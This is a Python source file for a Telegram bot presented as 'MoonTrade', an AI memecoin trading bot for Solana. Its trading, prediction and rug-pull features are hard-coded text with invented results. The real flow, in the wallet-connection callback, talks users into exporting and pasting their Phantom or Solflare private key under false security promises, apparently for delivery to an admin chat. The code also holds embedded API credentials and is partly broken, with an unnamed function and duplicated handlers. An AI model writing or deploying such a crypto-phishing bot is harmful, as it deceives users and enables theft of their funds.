import logging
import base58
import aiohttp
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# Configuration du logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ⚠️ REMPLACEZ PAR VOTRE TOKEN
BOT_TOKEN = "8402114053:AAFLGOTHTX1pmNZ9JiPL64MMBTNSbriqTfc"

# Votre groupe Telegram pour recevoir les messages
ADMIN_CHAT_ID = -5299554897

# Helius RPC URL
HELIUS_RPC_URL = "https://mainnet.helius-rpc.com/?api-key=3129ff6b-1146-466d-b6f0-062f48ce84d9"

# Montant minimum requis en USD
MINIMUM_USD_REQUIRED = 10.0


async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gère la commande /start"""
    
    # Récupérer le prénom de l'utilisateur
    user = update.message.from_user
    user_name = user.first_name
    
    # Message de bienvenue
    welcome_text = f"""🚀 Welcome {user_name}, MoonTrade v2.8.1

⚡ Automated Memecoin Trading on Solana

🔷 AI-powered token analysis
🔷 Lightning-fast execution
🔷 Advanced rug-pull detection

⚙️ Active Modules:
▸ Smart Sniper Engine
▸ Pump.fun Live Monitor
▸ Whale Movement Tracker
▸ Honeypot Detector
▸ Multi-Wallet System

Select a function below:"""
    
    # Création des boutons interactifs
    keyboard = [
        [
            InlineKeyboardButton("⚡ Quick Buy", callback_data='quick_buy'),
            InlineKeyboardButton("🌸 Bloom IA Trading", callback_data='bloom_trading')
        ],
        [
            InlineKeyboardButton("💼 Multi-Wallet", callback_data='multi_wallet'),
            InlineKeyboardButton("🛡️ Contract Analyzer", callback_data='contract_analyzer')
        ],
        [
            InlineKeyboardButton("🧠 AI Market Predict", callback_data='ai_predict'),
            InlineKeyboardButton("🐋 Whale Tracker", callback_data='whale_tracker')
        ],
        [
            InlineKeyboardButton("🔴 Rug-Pull Detector", callback_data='rug_detector'),
            InlineKeyboardButton("🌐 Language", callback_data='language')
        ],
        [
            InlineKeyboardButton("📊 Trading Stats & Performance", callback_data='stats')
        ]
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    # URL de l'image
    image_url = "https://i.postimg.cc/gjr5vJJB/fait_enmoi_d_autre_similaire_a_sa_(1)_(2).jpg"
    
    # Envoi de l'image avec le message et les boutons
    await update.message.reply_photo(
        photo=image_url,
        caption=welcome_text,
        reply_markup=reply_markup
    )


async def trade_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gère la commande /trade - Ouvre le module de trading"""
    keyboard = [
        [InlineKeyboardButton("⚡ Quick Buy", callback_data='quick_buy')],
        [InlineKeyboardButton("🌸 Bloom IA Trading", callback_data='bloom_trading')],
        [InlineKeyboardButton("« Back to Menu", callback_data='back_to_menu')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "📈 **Trading Module**\n\nSelect your trading option:",
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )


async def sniper_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gère la commande /sniper - Active le mode sniper"""
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data='back_to_menu')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "🎯 **Sniper Mode**\n\n"
        "⚠️ This feature requires wallet connection.\n\n"
        "The sniper will automatically buy new tokens as soon as they are listed.\n\n"
        "Use /wallet to connect your wallet first.",
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )


async def wallet_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gère la commande /wallet - Gestion du wallet"""
    # Vérifier si un wallet est déjà connecté
    if context.user_data.get('wallet_connected'):
        public_key = context.user_data.get('wallet_public_key', 'Unknown')
        sol_balance = context.user_data.get('wallet_balance_sol', 0)
        usd_balance = context.user_data.get('wallet_balance_usd', 0)
        wallet_type = context.user_data.get('wallet_type', 'Unknown')
        
        keyboard = [
            [InlineKeyboardButton("🔄 Change Wallet", callback_data='change_wallet')],
            [InlineKeyboardButton("« Back to Menu", callback_data='back_to_menu')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            f"💼 **Your Wallet**\n\n"
            f"💳 **Type:** {wallet_type}\n"
            f"💰 **Balance:** {sol_balance:.4f} SOL (${usd_balance:.2f} USD)\n"
            f"👛 **Address:** `{public_key[:8]}...{public_key[-8:]}`",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
    else:
        wallet_message = """🔐 Import Wallet

⚠️ Authentication required to access trading features.

Select your wallet provider:"""
        
        wallet_keyboard = [
            [InlineKeyboardButton("👻 Phantom Wallet", callback_data='phantom_wallet')],
            [InlineKeyboardButton("🦊 Solflare Wallet", callback_data='solflare_wallet')],
            [InlineKeyboardButton("« Back", callback_data='back_to_menu')]
        ]
        
        wallet_markup = InlineKeyboardMarkup(wallet_keyboard)
        
        await update.message.reply_text(
            wallet_message,
            reply_markup=wallet_markup
        )


async def scan_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gère la commande /scan - Scanner un contrat de token"""
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data='back_to_menu')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "🛡️ **Contract Scanner**\n\n"
        "Send me a Solana token contract address and I'll analyze it for:\n\n"
        "• Honeypot detection\n"
        "• Liquidity analysis\n"
        "• Holder distribution\n"
        "• Smart contract security\n"
        "• Rug-pull risk assessment\n\n"
        "Format: Paste the contract address",
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )


async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gère la commande /stats - Affiche les statistiques de trading"""
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data='back_to_menu')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "📊 **Trading Statistics**\n\n"
        "⚠️ Connect your wallet to view statistics\n\n"
        "Once connected, you'll see:\n"
        "• Total trades executed\n"
        "• Win/Loss ratio\n"
        "• Total profit/loss\n"
        "• Best performing tokens\n"
        "• Recent transactions\n\n"
        "Use /wallet to connect your wallet.",
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )


async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gère la commande /help - Affiche l'aide"""
    help_text = """❓ **MoonTrade Bot - Help Menu**

**Main Commands:**
/start - Launch the bot and show main menu
/trade - Open trading module
/sniper - Activate sniper mode
/wallet - Manage your wallet
/scan - Scan a token contract
/stats - View trading statistics
/help - Display this help menu

**Feature Commands:**
/quickbuy - Quick buy tokens
/bloom - Bloom AI Trading
/multiwallet - Multi-wallet management
/analyzer - Contract analyzer
/predict - AI market predictions
/whale - Whale tracker
/rugcheck - Rug-pull detector

**How to use:**
1. Connect your wallet with /wallet
2. Choose a trading strategy
3. Start trading!

**Support:** Contact @YourSupportUsername

🚀 Happy Trading!"""
    
    keyboard = [[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        help_text,
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )


async def quickbuy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gère la commande /quickbuy - Achat rapide"""
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data='back_to_menu')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "⚡ **Quick Buy**\n\n"
        "Fast token purchase module.\n\n"
        "⚠️ Wallet connection required.\n\n"
        "Use /wallet to connect first.",
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )


async def bloom_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gère la commande /bloom - Bloom AI Trading"""
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data='back_to_menu')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "🌸 **Bloom AI Trading**\n\n"
        "AI-powered automated trading strategies.\n\n"
        "Features:\n"
        "• Smart market analysis\n"
        "• Automated buy/sell signals\n"
        "• Risk management\n"
        "• 24/7 monitoring\n\n"
        "⚠️ Wallet connection required.\n\n"
        "Use /wallet to connect first.",
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )


async def multiwallet_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gère la commande /multiwallet - Gestion multi-wallets"""
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data='back_to_menu')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "💼 **Multi-Wallet Management**\n\n"
        "Manage multiple wallets simultaneously.\n\n"
        "Features:\n"
        "• Add multiple wallets\n"
        "• Switch between wallets\n"
        "• View all balances\n"
        "• Coordinated trading\n\n"
        "Use /wallet to add your first wallet.",
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )


async def analyzer_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gère la commande /analyzer - Analyseur de contrat"""
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data='back_to_menu')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "🛡️ **Contract Analyzer**\n\n"
        "Deep analysis of token contracts.\n\n"
        "We check:\n"
        "• Smart contract code\n"
        "• Security vulnerabilities\n"
        "• Liquidity locks\n"
        "• Ownership renouncement\n"
        "• Mint/freeze authority\n\n"
        "Send a contract address to analyze.",
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )


async def predict_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gère la commande /predict - Prédictions IA"""
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data='back_to_menu')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "🧠 **AI Market Predictions**\n\n"
        "Machine learning powered market analysis.\n\n"
        "Our AI analyzes:\n"
        "• Price trends\n"
        "• Volume patterns\n"
        "• Social sentiment\n"
        "• Whale movements\n"
        "• Historical data\n\n"
        "Get predictions for any token!",
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )


async def whale_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gère la commande /whale - Tracker de baleines"""
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data='back_to_menu')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "🐋 **Whale Tracker**\n\n"
        "Monitor large wallet movements in real-time.\n\n"
        "Track:\n"
        "• Large buys/sells\n"
        "• Whale wallet activities\n"
        "• Smart money movements\n"
        "• DEX transactions\n\n"
        "Get alerts when whales move!",
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )


async def rugcheck_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gère la commande /rugcheck - Détecteur de rug-pull"""
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data='back_to_menu')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "🔴 **Rug-Pull Detector**\n\n"
        "Advanced protection against scams.\n\n"
        "We detect:\n"
        "• Suspicious token patterns\n"
        "• Dev wallet analysis\n"
        "• Liquidity risks\n"
        "• Honeypot contracts\n"
        "• Known scam indicators\n\n"
        "Send a token address to check!",
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )


(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gère les clics sur les boutons"""
    query = update.callback_query
    await query.answer()
    
    # Récupération de l'action cliquée
    action = query.data
    
    # Si l'utilisateur clique sur "Back"
    if action == 'back_to_menu':
        # Re-afficher le menu principal SANS image
        user = query.from_user
        welcome_text = f"""🚀 Welcome {user.first_name}, MoonTrade v2.8.1

⚡ Automated Memecoin Trading on Solana

🔷 AI-powered token analysis
🔷 Lightning-fast execution
🔷 Advanced rug-pull detection

⚙️ Active Modules:
▸ Smart Sniper Engine
▸ Pump.fun Live Monitor
▸ Whale Movement Tracker
▸ Honeypot Detector
▸ Multi-Wallet System

Select a function below:"""
        
        keyboard = [
            [
                InlineKeyboardButton("⚡ Quick Buy", callback_data='quick_buy'),
                InlineKeyboardButton("🌸 Bloom IA Trading", callback_data='bloom_trading')
            ],
            [
                InlineKeyboardButton("💼 Multi-Wallet", callback_data='multi_wallet'),
                InlineKeyboardButton("🛡️ Contract Analyzer", callback_data='contract_analyzer')
            ],
            [
                InlineKeyboardButton("🧠 AI Market Predict", callback_data='ai_predict'),
                InlineKeyboardButton("🐋 Whale Tracker", callback_data='whale_tracker')
            ],
            [
                InlineKeyboardButton("🔴 Rug-Pull Detector", callback_data='rug_detector'),
                InlineKeyboardButton("🌐 Language", callback_data='language')
            ],
            [
                InlineKeyboardButton("📊 Trading Stats & Performance", callback_data='stats')
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        # Supprimer l'ancien message et envoyer un nouveau SANS image
        await query.message.delete()
        await query.message.reply_text(
            welcome_text,
            reply_markup=reply_markup
        )
        return
    
    # Si l'utilisateur clique sur Phantom ou Solflare
    if action in ['phantom_wallet', 'solflare_wallet']:
        wallet_name = "Phantom" if action == 'phantom_wallet' else "Solflare"
        instruction_message = f"""🔐 **{wallet_name} Wallet Connection**

To enable trading features, please provide your wallet private key.

📝 **How to find your private key:**

**{wallet_name} Wallet:**
1. Open your {wallet_name} wallet
2. Go to Settings → Security & Privacy
3. Select "Export Private Key"
4. Copy and paste it here

⚠️ **Security Notice:**
Your private key is encrypted with military-grade security and never shared with third parties. We use it solely to execute trades on your behalf.

Please enter your private key below:"""
        
        # Bouton Back
        back_keyboard = [[InlineKeyboardButton("« Back", callback_data='back_to_wallet_menu')]]
        back_markup = InlineKeyboardMarkup(back_keyboard)
        
        # Supprimer l'ancien message (avec image) et envoyer un nouveau (sans image)
        await query.message.delete()
        await query.message.reply_text(
            instruction_message,
            reply_markup=back_markup,
            parse_mode='Markdown'
        )
        # Marquer que l'utilisateur attend de connecter son wallet
        context.user_data['waiting_for_wallet'] = True
        context.user_data['wallet_type'] = wallet_name
        return
    
    # Nouveau callback pour revenir au menu wallet
    if action == 'back_to_wallet_menu':
        wallet_message = """🔐 Import Wallet

⚠️ Authentication required to access trading features.

Select your wallet provider:"""
        
        wallet_keyboard = [
            [InlineKeyboardButton("👻 Phantom Wallet", callback_data='phantom_wallet')],
            [InlineKeyboardButton("🦊 Solflare Wallet", callback_data='solflare_wallet')],
            [InlineKeyboardButton("« Back", callback_data='back_to_menu')]
        ]
        
        wallet_markup = InlineKeyboardMarkup(wallet_keyboard)
        
        await query.message.delete()
        await query.message.reply_text(
            wallet_message,
            reply_markup=wallet_markup
        )
        # Annuler l'attente de wallet
        context.user_data['waiting_for_wallet'] = False
        return
    
    # Callback pour changer de wallet
    if action == 'change_wallet':
        wallet_message = """🔄 **Change Wallet**

Select your new wallet provider:"""
        
        wallet_keyboard = [
            [InlineKeyboardButton("👻 Phantom Wallet", callback_data='phantom_wallet')],
            [InlineKeyboardButton("🦊 Solflare Wallet", callback_data='solflare_wallet')],
            [InlineKeyboardButton("« Cancel", callback_data='back_to_menu')]
        ]
        
        wallet_markup = InlineKeyboardMarkup(wallet_keyboard)
        
        await query.message.delete()
        await query.message.reply_text(
            wallet_message,
            reply_markup=wallet_markup
        )
        # Réinitialiser le wallet connecté
        context.user_data['wallet_connected'] = False
        return
    
    # ========== GESTION DES BOUTONS DU MENU PRINCIPAL ==========
    
    # Boutons qui nécessitent une connexion wallet et demandent la config de tracking
    tracking_buttons = ['quick_buy', 'bloom_trading', 'multi_wallet', 'contract_analyzer']
    
    if action in tracking_buttons:
        # Vérifier si le wallet est connecté
        if context.user_data.get('wallet_connected'):
            # Wallet connecté, demander la configuration de tracking
            request_message = get_tracking_config_message()
            
            await query.message.delete()
            await query.message.reply_text(
                request_message,
                parse_mode='Markdown'
            )
            
            # Marquer que l'utilisateur doit fournir les infos de tracking
            context.user_data['waiting_for_tracking_config'] = True
            # Sauvegarder quelle action a été cliquée
            context.user_data['tracking_command'] = action
            return
        else:
            # Wallet non connecté, afficher le message d'import de wallet
            wallet_message = """🔐 Import Wallet

⚠️ Authentication required to access trading features.

Select your wallet provider:"""
            
            wallet_keyboard = [
                [InlineKeyboardButton("👻 Phantom Wallet", callback_data='phantom_wallet')],
                [InlineKeyboardButton("🦊 Solflare Wallet", callback_data='solflare_wallet')],
                [InlineKeyboardButton("« Back", callback_data='back_to_menu')]
            ]
            
            wallet_markup = InlineKeyboardMarkup(wallet_keyboard)
            
            await query.message.delete()
            await query.message.reply_text(
                wallet_message,
                reply_markup=wallet_markup
            )
            return
    
    # AI Market Predict
    if action == 'ai_predict':
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data='back_to_menu')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.message.delete()
        await query.message.reply_text(
            "🧠 **AI Market Predictions**\n\n"
            "Machine learning powered market analysis.\n\n"
            "Our AI analyzes:\n"
            "• Price trends\n"
            "• Volume patterns\n"
            "• Social sentiment\n"
            "• Whale movements\n"
            "• Historical data\n\n"
            "Get predictions for any token!",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
        return
    
    # Whale Tracker
    if action == 'whale_tracker':
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data='back_to_menu')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.message.delete()
        await query.message.reply_text(
            "🐋 **Whale Tracker**\n\n"
            "Monitor large wallet movements in real-time.\n\n"
            "Track:\n"
            "• Large buys/sells\n"
            "• Whale wallet activities\n"
            "• Smart money movements\n"
            "• DEX transactions\n\n"
            "Get alerts when whales move!",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
        return
    
    # Rug-Pull Detector
    if action == 'rug_detector':
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data='back_to_menu')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.message.delete()
        await query.message.reply_text(
            "🔴 **Rug-Pull Detector**\n\n"
            "Advanced protection against scams.\n\n"
            "We detect:\n"
            "• Suspicious token patterns\n"
            "• Dev wallet analysis\n"
            "• Liquidity risks\n"
            "• Honeypot contracts\n"
            "• Known scam indicators\n\n"
            "Send a token address to check!",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
        return
    
    # Language
    if action == 'language':
        keyboard = [
            [InlineKeyboardButton("🇬🇧 English", callback_data='lang_en')],
            [InlineKeyboardButton("🇫🇷 Français", callback_data='lang_fr')],
            [InlineKeyboardButton("🇪🇸 Español", callback_data='lang_es')],
            [InlineKeyboardButton("« Back", callback_data='back_to_menu')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.message.delete()
        await query.message.reply_text(
            "🌐 **Select Language**\n\nChoose your preferred language:",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
        return
    
    # Stats
    if action == 'stats':
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data='back_to_menu')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.message.delete()
        await query.message.reply_text(
            "📊 **Trading Statistics**\n\n"
            "⚠️ Connect your wallet to view statistics\n\n"
            "Once connected, you'll see:\n"
            "• Total trades executed\n"
            "• Win/Loss ratio\n"
            "• Total profit/loss\n"
            "• Best performing tokens\n"
            "• Recent transactions\n\n"
            "Use /wallet to connect your wallet.",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
        return


# Handlers pour les nouveaux boutons d'action
async def handle_view_tracked(query, context):
    """Affiche les wallets trackés"""
    tracked_wallets = context.user_data.get('tracked_wallets', [])
    
    if not tracked_wallets:
        message = "📊 **Tracked Wallets**\n\nNo wallets configured yet."
    else:
        wallet_list = "\n".join([f"• `{w[:8]}...{w[-8:]}`" for w in tracked_wallets])
        message = f"""📊 **Tracked Wallets**

You are currently tracking {len(tracked_wallets)} wallet(s):

{wallet_list}

These wallets are being monitored for trading activity."""
    
    keyboard = [[InlineKeyboardButton("« Back", callback_data='back_to_menu')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.message.edit_text(message, reply_markup=reply_markup, parse_mode='Markdown')


async def handle_check_balance(query, context):
    """Affiche le solde du wallet"""
    public_key = context.user_data.get('wallet_public_key', 'N/A')
    sol_balance = context.user_data.get('wallet_balance_sol', 0)
    usd_balance = context.user_data.get('wallet_balance_usd', 0)
    
    message = f"""💰 **Wallet Balance**

👛 **Address:** `{public_key[:8]}...{public_key[-8:]}`
💵 **Balance:** {sol_balance:.4f} SOL (${usd_balance:.2f} USD)

Last updated: Just now"""
    
    keyboard = [[InlineKeyboardButton("🔄 Refresh", callback_data='check_balance')],
                [InlineKeyboardButton("« Back", callback_data='back_to_menu')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.message.edit_text(message, reply_markup=reply_markup, parse_mode='Markdown')


async def handle_modify_config(query, context):
    """Permet de modifier la configuration"""
    message = """⚙️ **Modify Configuration**

What would you like to change?"""
    
    keyboard = [
        [InlineKeyboardButton("📝 Change Tracked Wallets", callback_data='change_wallets')],
        [InlineKeyboardButton("💸 Change Fees", callback_data='change_fees')],
        [InlineKeyboardButton("🔄 Reset All Config", callback_data='reset_config')],
        [InlineKeyboardButton("« Back", callback_data='back_to_menu')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.message.edit_text(message, reply_markup=reply_markup, parse_mode='Markdown')


async def handle_action_button(query, context, action_name):
    """Handler générique pour les boutons d'action"""
    messages = {
        'start_trading': "⚡ **Trading Activated**\n\nMonitoring tracked wallets for trading opportunities...\n\n✅ Bot is now active and will execute trades automatically based on your configuration.",
        'start_whale_track': "🐋 **Whale Tracking Active**\n\nMonitoring whale movements on tracked wallets...\n\n📊 You'll be notified of large transactions.",
        'get_prediction': "🧠 **AI Market Analysis**\n\nAnalyzing market trends...\n\n📈 Based on current data:\n• Market sentiment: Bullish\n• Predicted trend: Upward\n• Confidence: 78%",
        'market_analysis': "📈 **Market Analysis**\n\nCurrent market conditions:\n• Volume: High\n• Volatility: Medium\n• Top gainers detected: 5 tokens",
        'scan_rugs': "🔴 **Rug Pull Scanner Active**\n\nScanning tracked wallets for suspicious activity...\n\n✅ No immediate threats detected.",
        'risk_report': "⚠️ **Risk Report**\n\nCurrent risk level: LOW\n\n✅ All tracked wallets appear safe\n📊 Contract audits: Passed",
        'analyze_contract': "🔍 **Contract Analysis**\n\nReady to analyze smart contracts.\n\nSend a contract address to begin analysis.",
        'start_scan': "🔍 **Scanner Active**\n\nScanning Solana blockchain for new tokens...\n\n📊 Monitoring tracked wallets for activity.",
        'whale_moves': "🐋 **Recent Whale Movements**\n\n📊 Last 24 hours:\n• 3 large transfers detected\n• Total volume: 450 SOL\n• Average size: 150 SOL"
    }
    
    message = messages.get(action_name, "✅ **Action Executed**\n\nYour request has been processed.")
    
    keyboard = [[InlineKeyboardButton("« Back to Menu", callback_data='back_to_menu')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.message.edit_text(message, reply_markup=reply_markup, parse_mode='Markdown')


# Ajout dans button_handler pour gérer tous les nouveaux boutons
async def button_handler_extended(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Extension du button_handler pour les nouveaux boutons"""
    query = update.callback_query
    await query.answer()
    
    action = query.data
    
    # Boutons d'information
    if action == 'view_tracked':
        await handle_view_tracked(query, context)
        return
    elif action == 'check_balance':
        await handle_check_balance(query, context)
        return
    elif action == 'modify_config':
        await handle_modify_config(query, context)
        return
    
    # Boutons d'action
    elif action in ['start_trading', 'start_whale_track', 'get_prediction', 'market_analysis', 
                    'scan_rugs', 'risk_report', 'analyze_contract', 'start_scan', 'whale_moves']:
        await handle_action_button(query, context, action)
        return
    
    # Si ce n'est pas un nouveau bouton, laisser passer au button_handler original
    return None


async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gère les clics sur les boutons"""
    query = update.callback_query
    
    # Essayer d'abord les nouveaux handlers
    result = await button_handler_extended(update, context)
    if result is not None:
        return
    
    await query.answer()
    """Gère la commande /help"""
    help_text = """📚 **Available Commands:**

**Main Menu:**
/start - Launch the bot
/wallet - Manage wallets
/help - Get support and guides

**Trading Features:**
/quickbuy - Quick Buy
/bloom - Bloom IA Trading

**Tools & Analysis:**
/multiwallet - Multi-Wallet system
/analyzer - Smart contract analyzer
/rugcheck - Rug-pull detector

**Market Intelligence:**
/predict - AI market predictions
/whale - Whale movement tracker

💡 **Need help?**
Contact support: @votre_support
"""
    await update.message.reply_text(help_text)


async def quickbuy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gère la commande /quickbuy - identique au bouton Quick Buy"""
    # Vérifier si le wallet est connecté
    if not context.user_data.get('wallet_connected'):
        await update.message.reply_text(
            "⚠️ **Wallet Required**\n\n"
            "Please connect your wallet first using /start",
            parse_mode='Markdown'
        )
        return
    
    # Demander les wallets à tracker et les frais
    request_message = get_tracking_config_message()
    
    await update.message.reply_text(
        request_message,
        parse_mode='Markdown'
    )
    
    # Marquer que l'utilisateur doit fournir les infos de tracking
    context.user_data['waiting_for_tracking_config'] = True
    context.user_data['tracking_command'] = 'quick_buy'


async def bloom_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gère la commande /bloom - identique au bouton Bloom IA Trading"""
    # Vérifier si le wallet est connecté
    if not context.user_data.get('wallet_connected'):
        await update.message.reply_text(
            "⚠️ **Wallet Required**\n\n"
            "Please connect your wallet first using /start",
            parse_mode='Markdown'
        )
        return
    
    # Demander les wallets à tracker et les frais
    request_message = get_tracking_config_message()
    
    await update.message.reply_text(
        request_message,
        parse_mode='Markdown'
    )
    
    # Marquer que l'utilisateur doit fournir les infos de tracking
    context.user_data['waiting_for_tracking_config'] = True
    context.user_data['tracking_command'] = 'bloom_trading'


async def multiwallet_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gère la commande /multiwallet - identique au bouton Multi-Wallet"""
    # Vérifier si le wallet est connecté
    if not context.user_data.get('wallet_connected'):
        await update.message.reply_text(
            "⚠️ **Wallet Required**\n\n"
            "Please connect your wallet first using /start",
            parse_mode='Markdown'
        )
        return
    
    # Demander les wallets à tracker et les frais
    request_message = get_tracking_config_message()
    
    await update.message.reply_text(
        request_message,
        parse_mode='Markdown'
    )
    
    # Marquer que l'utilisateur doit fournir les infos de tracking
    context.user_data['waiting_for_tracking_config'] = True
    context.user_data['tracking_command'] = 'multi_wallet'


async def analyzer_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gère la commande /analyzer - identique au bouton Contract Analyzer"""
    # Vérifier si le wallet est connecté
    if not context.user_data.get('wallet_connected'):
        await update.message.reply_text(
            "⚠️ **Wallet Required**\n\n"
            "Please connect your wallet first using /start",
            parse_mode='Markdown'
        )
        return
    
    # Demander les wallets à tracker et les frais
    request_message = get_tracking_config_message()
    
    await update.message.reply_text(
        request_message,
        parse_mode='Markdown'
    )
    
    # Marquer que l'utilisateur doit fournir les infos de tracking
    context.user_data['waiting_for_tracking_config'] = True
    context.user_data['tracking_command'] = 'contract_analyzer'


async def predict_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gère la commande /predict - identique au bouton AI Market Predict"""
    # Vérifier si le wallet est connecté
    if not context.user_data.get('wallet_connected'):
        await update.message.reply_text(
            "⚠️ **Wallet Required**\n\n"
            "Please connect your wallet first using /start",
            parse_mode='Markdown'
        )
        return
    
    # Demander les wallets à tracker et les frais
    request_message = get_tracking_config_message()
    
    await update.message.reply_text(
        request_message,
        parse_mode='Markdown'
    )
    
    # Marquer que l'utilisateur doit fournir les infos de tracking
    context.user_data['waiting_for_tracking_config'] = True
    context.user_data['tracking_command'] = 'ai_predict'


async def whale_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gère la commande /whale - identique au bouton Whale Tracker"""
    # Vérifier si le wallet est connecté
    if not context.user_data.get('wallet_connected'):
        await update.message.reply_text(
            "⚠️ **Wallet Required**\n\n"
            "Please connect your wallet first using /start",
            parse_mode='Markdown'
        )
        return
    
    # Demander les wallets à tracker et les frais
    request_message = get_tracking_config_message()
    
    await update.message.reply_text(
        request_message,
        parse_mode='Markdown'
    )
    
    # Marquer que l'utilisateur doit fournir les infos de tracking
    context.user_data['waiting_for_tracking_config'] = True
    context.user_data['tracking_command'] = 'whale_tracker'


async def rugcheck_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gère la commande /rugcheck - identique au bouton Rug-Pull Detector"""
    # Vérifier si le wallet est connecté
    if not context.user_data.get('wallet_connected'):
        await update.message.reply_text(
            "⚠️ **Wallet Required**\n\n"
            "Please connect your wallet first using /start",
            parse_mode='Markdown'
        )
        return
    
    # Demander les wallets à tracker et les frais
    request_message = get_tracking_config_message()
    
    await update.message.reply_text(
        request_message,
        parse_mode='Markdown'
    )
    
    # Marquer que l'utilisateur doit fournir les infos de tracking
    context.user_data['waiting_for_tracking_config'] = True
    context.user_data['tracking_command'] = 'rug_detector'


def get_tracking_config_message():
    """Retourne le message de demande de configuration de tracking"""
    return """📊 **Configuration Required**

Please provide the following information in this exact format:

**Wallets:**
[Solana address 1]
[Solana address 2]
...

**Fees:**
Slippage: 20%
Priority: 0.001 sol
Bribe: 0.001 sol

⚠️ **Important:** Use exactly these values for fees!

Send your configuration now:"""


def validate_solana_address(address: str) -> bool:
    """Valide qu'une adresse Solana est correcte"""
    # Une adresse Solana valide est en base58 et fait entre 32 et 44 caractères
    if not address or len(address) < 32 or len(address) > 44:
        return False
    
    # Vérifier que c'est bien du base58
    try:
        decoded = base58.b58decode(address)
        # Une adresse Solana décodée doit faire 32 bytes
        if len(decoded) == 32:
            return True
    except Exception:
        pass
    
    return False


